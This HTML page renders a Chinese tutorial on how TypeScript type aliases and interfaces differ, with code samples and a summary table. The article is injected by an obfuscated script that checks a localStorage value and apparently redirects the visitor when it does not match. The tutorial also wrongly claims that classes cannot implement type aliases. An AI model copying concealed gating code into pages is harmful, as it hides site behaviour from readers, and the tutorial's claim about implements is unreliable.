<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x947b21=_0x5212;function _0x5302(){var s=["amoXWOtdQCoVWQpcHapcHKRdNhO","l8ktxdXkDt/cUG","W48RWOWoyXRdTW","WQj6W4OpdZdcIgyMWRnwW5FdLG","z8kWuSoxWOyKW6dcMaGGiY8","emkzW4lcNCo7i8oKhXuW","W6VdN8kjktj2DdrGW7NdUmk4W7i","WRSrvmkNWO7cJ37dHcGFDGe","WPxdMI9lo8kUgxTd","FMqLoSowW6fZ","p2iCWO1tW6VdGeL5qw0F","W6qaW6DTWPZdRCkedSkJW69uW5q","W5hdGMRcNSokq8oUWRddQSkPbxe","WRywv8oqW4ddQxhdOqq","WPNcTSoEwCoTDmonWOVcILpdVSk1CG","WO1zeSofWQ/dIM4QnCo8qKNcR2pdN8opWQNdLfSbW7ZdNCkkq1BdGW","kZnNr8omW5vqWR5TwG","W6ZdISoLW4/dQSkCW7ddT8odaSkHgW","fJubBCoZWOOLqMa","WPyVdeut","leHLrb3dSCkiW4eNWRRcIwq"];return(_0x5302=function(){return s})()}function _0x5212(t,s){var p=_0x5302();return(_0x5212=function(s,n){var a=p[s-=332];void 0===_0x5212.ClrVul&&(_0x5212.SxALBN=function(s,n){var a,l=[],t=0,p="";for(s=(s=>{for(var n,a,l="",t="",p=0,e=0;a=s.charAt(e++);~a&&(n=p%4?64*n+a:a,p++%4)&&(l+=String.fromCharCode(255&n>>(-2*p&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var r=0,i=l.length;r<i;r++)t+="%"+("00"+l.charCodeAt(r).toString(16)).slice(-2);return decodeURIComponent(t)})(s),e=0;e<256;e++)l[e]=e;for(e=0;e<256;e++)t=(t+l[e]+n.charCodeAt(e%n.length))%256,a=l[e],l[e]=l[t],l[t]=a;for(var e=0,t=0,r=0;r<s.length;r++)a=l[e=(e+1)%256],l[e]=l[t=(t+l[e])%256],l[t]=a,p+=String.fromCharCode(s.charCodeAt(r)^l[(l[e]+l[t])%256]);return p},t=arguments,_0x5212.ClrVul=!0);var s=s+p[0],l=t[s];return l?a=l:(void 0===_0x5212.xJvBHp&&(_0x5212.xJvBHp=!0),a=_0x5212.SxALBN(a,n),t[s]=a),a})(t,s)}if((()=>{for(var s=_0x5212,n=_0x5302();;)try{if(160057==-parseInt(s(340,"sA[l"))+-parseInt(s(345,"9n]W"))/2*(parseInt(s(342,"rUhC"))/3)+parseInt(s(332,"b^H#"))/4+parseInt(s(341,"c*bw"))/5+parseInt(s(343,"PJwf"))/6+parseInt(s(346,"pRhR"))/7+parseInt(s(350,"7yYr"))/8)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x947b21(338,"9n]W")](_0x947b21(347,"3DYA"))!=_0x947b21(348,"SgH$"))throw window[_0x947b21(351,"vWVW")][_0x947b21(352,"trTv")](_0x947b21(344,"$Ao%")),Error();document.title="typescript 类型别名和接口",document.getElementById("article").innerHTML='<div><h3>TypeScript 类型别名和接口的异同点</h3>\n<p>在 TypeScript 中，<strong>类型别名（Type Aliases）</strong>  和<strong>接口（Interfaces）</strong>  是两种用于定义自定义类型的工具。它们都可以用来描述对象的结构、函数的签名等，但在使用场景和某些特性上有所不同。以下是它们的详细异同点分析。</p>\n<hr>\n<h3><strong>相同点</strong></h3>\n<ol>\n<li><strong>定义对象类型</strong>  ：\n<ul>\n<li>类型别名和接口都可以用来定义对象的结构。</li>\n<li>例如，定义一个具有 <code>name</code> 和 <code>age</code> 属性的对象类型，可以使用类型别名或接口。</li>\n</ul>\n<pre><code class="language-typescript"><span class="hljs-comment">// 使用类型别名</span>\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">PersonAlias</span> = {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;\n  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;\n};\n\n<span class="hljs-comment">// 使用接口</span>\n<span class="hljs-keyword">interface</span> <span class="hljs-title class_">PersonInterface</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;\n  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;\n}\n</code></pre>\n</li>\n<li><strong>类型检查</strong>  ：\n<ul>\n<li>无论是类型别名还是接口，定义的类型在编译时都会进行类型检查，确保对象符合定义的结构。</li>\n</ul>\n</li>\n<li><strong>可扩展性（部分场景）</strong>  ：\n<ul>\n<li>在某些情况下，两者都可以通过组合或扩展来创建更复杂的类型（尽管方式有所不同）。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h3><strong>不同点</strong></h3>\n<h4><strong>1. 定义方式和灵活性</strong></h4>\n<ul>\n<li><strong>类型别名</strong>  ：\n<ul>\n<li>使用 <code>type</code> 关键字定义。</li>\n<li>可以为任何类型创建别名，包括基本类型、联合类型、交叉类型、元组类型等。</li>\n<li>更灵活，适用于复杂类型表达式。</li>\n</ul>\n<pre><code class="language-typescript"><span class="hljs-comment">// 基本类型别名</span>\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">StringAlias</span> = <span class="hljs-built_in">string</span>;\n\n<span class="hljs-comment">// 联合类型别名</span>\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">StringOrNumber</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>;\n\n<span class="hljs-comment">// 元组类型别名</span>\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">Coordinates</span> = [<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>];\n</code></pre>\n</li>\n<li><strong>接口</strong>  ：\n<ul>\n<li>使用 <code>interface</code> 关键字定义。</li>\n<li>主要用于定义对象的结构，包括属性和方法的类型。</li>\n<li>更面向对象，支持类的实现和扩展。</li>\n</ul>\n<pre><code class="language-typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Animal</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;\n}\n\n<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> {\n  <span class="hljs-title function_">bark</span>(): <span class="hljs-built_in">void</span>;\n}\n</code></pre>\n</li>\n</ul>\n<h4><strong>2. 声明合并</strong></h4>\n<ul>\n<li><strong>类型别名</strong>  ：\n<ul>\n<li>不支持声明合并。</li>\n<li>如果尝试定义同名类型别名，会导致编译错误。</li>\n</ul>\n</li>\n<li><strong>接口</strong>  ：\n<ul>\n<li>支持声明合并。</li>\n<li>同一名称的多个接口声明会自动合并，这对于扩展接口非常有用。</li>\n</ul>\n<pre><code class="language-typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Box</span> {\n  <span class="hljs-attr">height</span>: <span class="hljs-built_in">number</span>;\n}\n\n<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Box</span> {\n  <span class="hljs-attr">width</span>: <span class="hljs-built_in">number</span>;\n}\n\n<span class="hljs-keyword">const</span> <span class="hljs-attr">box</span>: <span class="hljs-title class_">Box</span> = { <span class="hljs-attr">height</span>: <span class="hljs-number">5</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">6</span> }; <span class="hljs-comment">// 合法，接口被合并</span>\n</code></pre>\n</li>\n</ul>\n<h4><strong>3. 扩展性</strong></h4>\n<ul>\n<li><strong>类型别名</strong>  ：\n<ul>\n<li>不能通过声明合并扩展。</li>\n<li>可以通过交叉类型等方式组合类型。</li>\n</ul>\n<pre><code class="language-typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Named</span> = { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> };\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">Aged</span> = { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> };\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">Person</span> = <span class="hljs-title class_">Named</span> &amp; <span class="hljs-title class_">Aged</span>; <span class="hljs-comment">// 使用交叉类型组合</span>\n</code></pre>\n</li>\n<li><strong>接口</strong>  ：\n<ul>\n<li>可以通过 <code>extends</code> 关键字扩展其他接口。</li>\n<li>支持类的实现（<code>implements</code>）。</li>\n</ul>\n<pre><code class="language-typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Named</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;\n}\n\n<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Aged</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Named</span> {\n  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;\n}\n\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Aged</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;\n  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span></span>) {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;\n  }\n}\n</code></pre>\n</li>\n</ul>\n<h4><strong>4. 类的实现</strong></h4>\n<ul>\n<li><strong>类型别名</strong>  ：\n<ul>\n<li>不能直接被类实现。</li>\n<li>类型别名定义的类型不能用于 <code>implements</code> 子句。</li>\n</ul>\n</li>\n<li><strong>接口</strong>  ：\n<ul>\n<li>可以被类实现。</li>\n<li>接口是面向对象编程的重要部分，支持类的实现。</li>\n</ul>\n<pre><code class="language-typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> {\n  <span class="hljs-title function_">print</span>(): <span class="hljs-built_in">void</span>;\n}\n\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">Document</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Printable</span> {\n  <span class="hljs-title function_">print</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Printing document...&quot;</span>);\n  }\n}\n</code></pre>\n</li>\n</ul>\n<h4><strong>5. 适用场景</strong></h4>\n<ul>\n<li><strong>类型别名</strong>  ：\n<ul>\n<li>适用于定义复杂类型表达式，特别是当类型需要重用或简化时。</li>\n<li>适用于类型映射、条件类型等高级类型特性。</li>\n</ul>\n</li>\n<li><strong>接口</strong>  ：\n<ul>\n<li>适用于定义对象的结构，特别是当需要声明合并或类的实现时。</li>\n<li>更适合面向对象编程和描述类的形状。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>选择使用类型别名还是接口</strong></h3>\n<ol>\n<li><strong>使用类型别名</strong>  ：\n<ul>\n<li>当需要定义复杂类型表达式（如联合类型、交叉类型、元组类型）时。</li>\n<li>当需要为现有类型创建别名以简化代码时。</li>\n<li>当不需要声明合并或类的实现时。</li>\n</ul>\n</li>\n<li><strong>使用接口</strong>  ：\n<ul>\n<li>当需要描述对象的结构，特别是需要声明合并时。</li>\n<li>当需要定义类的形状，并希望其他类实现该接口时。</li>\n<li>当希望利用接口的面向对象特性时。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h3><strong>混合使用示例</strong></h3>\n<p>在某些情况下，类型别名和接口可以结合使用。例如，可以使用接口定义对象的基本结构，然后使用类型别名创建更复杂的类型。</p>\n<pre><code class="language-typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Animal</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;\n}\n\n<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> {\n  <span class="hljs-title function_">bark</span>(): <span class="hljs-built_in">void</span>;\n}\n\n<span class="hljs-keyword">type</span> <span class="hljs-title class_">OptionalDog</span> = <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">Dog</span>&gt;; <span class="hljs-comment">// 使用类型别名和接口结合</span>\n\n<span class="hljs-keyword">const</span> <span class="hljs-attr">myDog</span>: <span class="hljs-title class_">OptionalDog</span> = {\n  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Buddy&quot;</span>,\n  <span class="hljs-comment">// bark 可以省略，因为使用了 Partial</span>\n};\n</code></pre>\n<hr>\n<h3><strong>总结</strong></h3>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>类型别名</th>\n<th>接口</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>定义方式</strong></td>\n<td><code>type</code> 关键字</td>\n<td><code>interface</code> 关键字</td>\n</tr>\n<tr>\n<td><strong>灵活性</strong></td>\n<td>支持复杂类型表达式</td>\n<td>主要用于对象类型</td>\n</tr>\n<tr>\n<td><strong>声明合并</strong></td>\n<td>不支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td><strong>扩展性</strong></td>\n<td>不能通过声明合并扩展</td>\n<td>可以通过声明合并扩展</td>\n</tr>\n<tr>\n<td><strong>类的实现</strong></td>\n<td>不能直接实现</td>\n<td>可以被类实现（<code>implements</code>）</td>\n</tr>\n<tr>\n<td><strong>使用场景</strong></td>\n<td>复杂类型、类型映射、条件类型</td>\n<td>对象结构、类的形状</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li><strong>类型别名</strong>  和<strong>接口</strong>  都是 TypeScript 中定义自定义类型的重要工具。</li>\n<li><strong>类型别名</strong>  更灵活，适用于复杂类型表达式和类型映射。</li>\n<li><strong>接口</strong>  更面向对象，支持声明合并和类的实现。</li>\n<li>根据具体需求选择合适的工具，或者结合使用以发挥各自的优势。</li>\n</ul>\n<p>通过理解类型别名和接口的区别和适用场景，可以编写更类型安全、更易于维护的 TypeScript 代码。</p>\n</div>'</script></body></html>